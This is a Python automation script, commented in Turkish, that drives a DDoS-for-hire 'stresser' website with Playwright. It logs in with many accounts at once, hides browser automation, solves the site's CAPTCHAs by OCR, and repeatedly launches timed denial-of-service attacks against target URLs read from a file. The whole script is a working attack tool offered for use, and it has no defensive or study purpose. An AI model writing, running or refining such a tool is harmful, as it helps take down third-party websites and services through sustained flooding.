import threading, time, os, re, base64, io, sys, logging
from playwright.sync_api import sync_playwright
from PIL import Image
import ddddocr

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)
ocr = ddddocr.DdddOcr()

class DDoSNow:
    def __init__(self):
        self.base_url = "https://cryptostresser.ba"
        self.accounts = self.load_accounts()
        self.running = {}
        
    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test1:pass:https://example.com\n")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":")
                    if len(p) >= 3:
                        accounts.append({"user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
        return accounts
    
    def solve_captcha(self, page):
        try:
            # Deploy butonunu bul (farklı selector dene)
            deploy_btn = page.locator("button:has-text('Deploy Attack')").first
            if deploy_btn.count() == 0:
                deploy_btn = page.locator(".btn-confirm").first
            deploy_btn.click()
            time.sleep(2)
        except Exception as e:
            logger.warning(f"Deploy butonu bulunamadı: {e}")
            return False
            
        while True:
            try:
                img = page.locator("img[alt='captcha']").first
                if img.count() == 0:
                    img = page.locator("img[src*='captcha']").first
                if img.count():
                    b64 = re.sub(r'^data:image/\w+;base64,', '', img.get_attribute("src"))
                    text = re.sub(r'[^A-Z0-9]', '', ocr.classification(Image.open(io.BytesIO(base64.b64decode(b64)))).upper())
                    if text:
                        captcha_input = page.locator("input[name='captcha']").first
                        if captcha_input.count() == 0:
                            captcha_input = page.locator("input[placeholder*='captcha']").first
                        captcha_input.fill(text)
                        time.sleep(0.5)
                        
                        btn = page.locator("button[type='submit']").first
                        if btn.count():
                            btn.click()
                            time.sleep(2)
                            if page.locator("text=Invalid captcha").count() == 0:
                                return True
            except Exception as e:
                logger.debug(f"Captcha hatası: {e}")
            time.sleep(2)
    
    def worker(self, acc):
        user, pwd, target = acc["user"], acc["pass"], acc["target"]
        while self.running.get(user, False):
            try:
                with sync_playwright() as p:
                    ctx = p.chromium.launch_persistent_context(
                        user_data_dir=f"profiles/{user}", 
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720}
                    )
                    page = ctx.new_page()
                    page.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
                    
                    # Login
                    logger.info(f"[{user}] Giriş sayfasına gidiliyor...")
                    page.goto(f"{self.base_url}/login", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(2)
                    
                    # Kullanıcı adı ve şifre
                    page.fill("input[name='username']", user)
                    page.fill("input[name='password']", pwd)
                    page.click("button[type='submit']")
                    time.sleep(3)
                    
                    # Hub'a git
                    logger.info(f"[{user}] Hub sayfasına gidiliyor...")
                    page.goto(f"{self.base_url}/hub", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(3)
                    
                    if "login" in page.url:
                        logger.error(f"[{user}] Giriş başarısız!")
                        time.sleep(30)
                        continue
                    
                    logger.info(f"[{user}] Giriş başarılı!")
                    
                    # Ana döngü
                    while self.running.get(user, False):
                        try:
                            # Hedef URL - farklı selector dene
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                target_input = page.locator("input[placeholder*='Target']").first
                            if target_input.count() == 0:
                                target_input = page.locator("input[placeholder*='URL']").first
                            target_input.fill(target, timeout=10000)
                            
                            # Süre
                            time_input = page.locator("input[name='hub.0.time']").first
                            if time_input.count() == 0:
                                time_input = page.locator("input[placeholder*='time']").first
                            time_input.fill("300", timeout=10000)
                            
                            logger.info(f"[{user}] Captcha çözülüyor...")
                            if self.solve_captcha(page):
                                logger.info(f"[{user}] Attack başladı! - {target}")
                                
                                # Süre takibi
                                while self.running.get(user, False):
                                    try:
                                        badge = page.locator(".badge").first
                                        if badge.count():
                                            t = badge.text_content().strip()
                                            logger.info(f"[{user}] Kalan: {t}")
                                            if t in ["0m 0s", "0s", "0"]:
                                                break
                                    except:
                                        pass
                                    time.sleep(5)
                            else:
                                logger.warning(f"[{user}] Captcha çözülemedi, yeniden deneniyor...")
                            
                            page.reload()
                            time.sleep(3)
                            
                        except Exception as e:
                            logger.error(f"[{user}] İşlem hatası: {e}")
                            time.sleep(2)
                            page.reload()
                            time.sleep(3)
                            
                    ctx.close()
                    
            except Exception as e:
                logger.error(f"[{user}] Kritik hata: {e}")
                time.sleep(10)
    
    def start(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for a in self.accounts:
            self.running[a["user"]] = True
            t = threading.Thread(target=self.worker, args=(a,), daemon=True)
            t.start()
            logger.info(f"[{a['user']}] Saldırı başlatıldı - Hedef: {a['target']}")
            time.sleep(2)
            
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for u, r in self.running.items():
                target = next((a["target"] for a in self.accounts if a["user"] == u), "Bilinmiyor")
                status = "Çalışıyor" if r else "Durduruldu"
                logger.info(f"  {u}: {status} - Hedef: {target}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   DDoSNow.com Automation                  ║
    ║   https://cryptostresser.ba               ║
    ╚═══════════════════════════════════════════╝
    """)
    DDoSNow().start()
